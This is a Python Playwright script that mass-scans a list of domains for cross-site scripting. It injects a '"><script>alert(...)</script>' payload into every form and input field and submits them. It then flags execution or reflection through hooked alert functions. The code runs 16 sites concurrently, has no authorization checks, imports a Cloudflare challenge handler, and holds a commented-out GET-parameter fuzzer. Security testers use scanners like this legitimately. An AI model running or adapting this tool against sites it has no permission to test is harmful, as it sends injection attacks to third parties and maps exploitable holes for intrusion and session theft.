import asyncio, os, random, string, time
from typing import Set, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from playwright._impl._errors import TargetClosedError
from playwright.async_api import async_playwright, Page, Browser, BrowserContext
from utils                import handle_cloudflare_challenge

CONCURRENCY     = 16
SCREENSHOT_DIR  = "screenshots"
TIMEOUT         = 20_000          # page.goto() timeout in ms
XSS_TOKEN_LEN   = 8
PAYLOAD_TMPL    = '"><script>alert("XSS:%s")</script>'

def make_payload() -> tuple[str, str]:
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=XSS_TOKEN_LEN))
    return token, PAYLOAD_TMPL % token

async def discover_forms(page: Page):
    return await page.query_selector_all("form")

async def extract_form_inputs(form) -> tuple[List[any], List[str]]:
    try:
        inputs = await form.query_selector_all(
            "input:not([type='hidden']):not([disabled]):not([readonly]), "
            "textarea:not([disabled]):not([readonly]), "
            "select:not([disabled]):not([readonly])"
            # "[contenteditable='true']"
        )
    except:
        return [], []
    names  = [await el.get_attribute("name") or
              await el.get_attribute("id")   or f"idx-{i}"
              for i, el in enumerate(inputs)]
    return inputs, names

# async def fuzz_get(page: Page, base_url: str, console_hits: Set[str]):
#     """Inject payload into each GET param once."""
#     parsed = urlparse(base_url)
#     qs     = parse_qs(parsed.query, keep_blank_values=True)
#     for param in qs:
#         token, payload = make_payload()
#         mutated        = qs.copy()
#         mutated[param] = payload
#         testurl        = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
#
#         await page.goto(testurl, wait_until="domcontentloaded", timeout=TIMEOUT)
#         await handle_cloudflare_challenge(page, testurl, options={"verbose": False})
#
#         if token in console_hits:
#             print(f"[XSS:EXEC] {testurl}  param={param}")
#             continue
#
#         if token in (await page.content()):
#             print(f"[XSS:REFL] {testurl}  param={param}")

async def fuzz_forms(page: Page, console_hits: Set[str]):
    forms = await discover_forms(page)
    found_vuln = False
    if forms:
        for form in forms:
            inputs, names = await extract_form_inputs(form)
            if len(names) == 0:
                continue

            for el, field_label in zip(inputs, names):
                token, payload = make_payload()
                try:
                    await el.fill(payload)
                except TargetClosedError:
                    return
                except Exception:
                    return

                try:
                    await asyncio.gather(
                        form.evaluate("(f)=>{ try{f.submit()}catch(e){} }"),
                        page.wait_for_load_state("domcontentloaded",
                                                 timeout=TIMEOUT)
                    )
                except TargetClosedError:
                    return  # stay on same page
                except Exception:
                    return

                # await handle_cloudflare_challenge(page, page.url,
                #                                   options={"verbose": False})
                try:
                    await page.wait_for_load_state("networkidle", timeout=TIMEOUT)
                    html = await page.content()
                except Exception:
                    print(f"{page.url} Failed")
                    return
                if token in console_hits:
                    print(f"[XSS:EXEC] {page.url}  form-field={field_label}")
                    found_vuln = True
                elif token in html:
                    print(f"[XSS:REFL] {page.url}  form-field={field_label}")
                    found_vuln = True
                break
        return

    try:
        inputs = await page.query_selector_all(
            "input:not([type='hidden']):not([disabled]):not([readonly]), "
            "textarea:not([disabled]):not([readonly]), "
            "select:not([disabled]):not([readonly]), "
            "[contenteditable='true']"
        )
    except:
        # print(f"Found no xss vulnerabilities for {page.url}")
        return
    inputs = inputs[:120]
    if not inputs:
        # print(f"Found no xss vulnerabilities for {page.url}")
        return

    # print(f"{page.url}: {inputs}")

    for el in inputs:
        await el.focus()
        try:
            await el.type("test")
            token, payload = make_payload()
            await el.fill(payload)
        except Exception:
            return

        try:
            # await el.press("Enter")
            await page.keyboard.press("Enter")
        except Exception:
            return

        # await handle_cloudflare_challenge(page, page.url,
        #                                   options={"verbose": False})

        try:
            await page.wait_for_load_state("networkidle", timeout=TIMEOUT)
            html = await page.content()
        except:
            print(f"{page.url} Failed")
            return
        if token in console_hits:
            print(f"[XSS:EXEC] {page.url}")
        elif token in html:
            print(f"[XSS:REFL] {page.url}")
        break


async def grab(url: str, browser: Browser, sem: asyncio.Semaphore, outfile: str) -> None:
    async with sem:
        context: BrowserContext = await browser.new_context(
            viewport={"width": 1280, "height": 720},
            locale="en-US"
        )
        page: Page = await context.new_page()

        console_hits: Set[str] = set()
        page.on("console", lambda msg: _collect_console(msg, console_hits))
        await page.add_init_script("""
            (() => {
              const send = (tag,data) => console.debug(tag+":"+data);
              ['alert','confirm','prompt']
                  .forEach(fn => { window[fn] = msg => send('XSS', msg); });
            })();
        """)

        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=TIMEOUT)
        except Exception as e:
            print(f"Error navigating to {url}: {e}")
            await context.close()
            return

        # await handle_cloudflare_challenge(page, url, options={"verbose": True})

        # await fuzz_get(page, url, console_hits)
        await fuzz_forms(page, console_hits)

        # try: await page.screenshot(path=outfile, full_page=True)
        # except Exception as e: print(f"Screenshot error for {url}: {e}")

        try:
            await context.close()
        except:
            return

# collect console tokens
def _collect_console(msg, bucket: Set[str]):
    if msg.type in ("debug", "log") and msg.text.startswith("XSS:"):
        bucket.add(msg.text.split("XSS:")[-1])

async def main():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    # read URLs
    urls: List[str] = []
    with open("urls.txt") as f:
        for line in f:
            domain = line.strip()
            if domain:
                if "http" in domain:
                    urls.append(domain)
                else:
                    urls.append("https://www." + domain)

    if not urls:
        print("No URLs found!")
        return

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True, args=["--disable-features=AudioServiceOutOfProcess"])
        sem      = asyncio.Semaphore(CONCURRENCY)

        tasks = [
            grab(u, browser, sem, os.path.join(SCREENSHOT_DIR, f"{urlparse(u).hostname}.png"))
            for u in urls
        ]
        await asyncio.gather(*tasks)
        await browser.close()

if __name__ == "__main__":
    t0        = time.time()
    num_urls  = sum(1 for _ in open("urls.txt") if _.strip())
    print(f"Total URLs to process: {num_urls}")
    asyncio.run(main())
    elapsed   = time.time() - t0
    print(f"Done in {elapsed:.1f}s  —  {num_urls/elapsed:.2f} URLs/s")
